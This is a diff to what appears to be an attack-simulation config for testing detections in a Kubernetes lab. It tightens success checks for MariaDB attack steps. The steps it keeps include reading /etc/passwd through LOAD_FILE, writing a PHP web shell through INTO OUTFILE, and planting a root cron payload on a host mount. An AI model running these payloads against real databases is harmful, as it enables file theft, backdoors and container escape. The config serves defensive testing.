@@ -80,7 +80,9 @@ attacks:
     exec:
       command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-N", "-e", "SELECT LENGTH(LOAD_FILE('/etc/passwd'));"]
     successIndicators:
-      - responseRegex: "[0-9]+"
+      # Anchor to a whole-line positive integer — bare "[0-9]+" matches
+      # error strings like "ERROR 2002 ..." too.
+      - responseRegex: "(?m)^[1-9][0-9]*$"
     expectedDetections: []
 
   # T1611 — Escape to Host: read host-mounted file via the /host-etc mount.
@@ -132,7 +134,11 @@ attacks:
       command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/log/mysql/bob_probe.php';"]
     successIndicators:
       - responseContains: "Query OK"
-      - responseContains: "ERROR 1086"  # ER_FILE_EXISTS — already staged
+      # Note: ER_FILE_EXISTS (1086) is intentionally NOT a success — it means a
+      # prior iteration's stale artifact is blocking the write. Each fresh CI
+      # deployment starts from an empty /var/log/mysql + /host-tmp so the first
+      # iteration succeeds. Local-iteration users should `kubectl rollout
+      # restart deployment/mariadb -n mariadb` between full reruns.
     expectedDetections: []
 
   # T1611 — Cross-namespace persistence stage: drop a cron-style payload to
@@ -145,7 +151,11 @@ attacks:
       command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SELECT '* * * * * root /bin/sh /tmp/.r 2>/dev/null' INTO OUTFILE '/host-tmp/.bob_mariadb_cron_probe';"]
     successIndicators:
       - responseContains: "Query OK"
-      - responseContains: "ERROR 1086"  # ER_FILE_EXISTS — already staged
+      # Note: ER_FILE_EXISTS (1086) is intentionally NOT a success — it means a
+      # prior iteration's stale artifact is blocking the write. Each fresh CI
+      # deployment starts from an empty /var/log/mysql + /host-tmp so the first
+      # iteration succeeds. Local-iteration users should `kubectl rollout
+      # restart deployment/mariadb -n mariadb` between full reruns.
     expectedDetections: []
 
   # T1505.001 — Server Software Component: UDF library RCE attempt
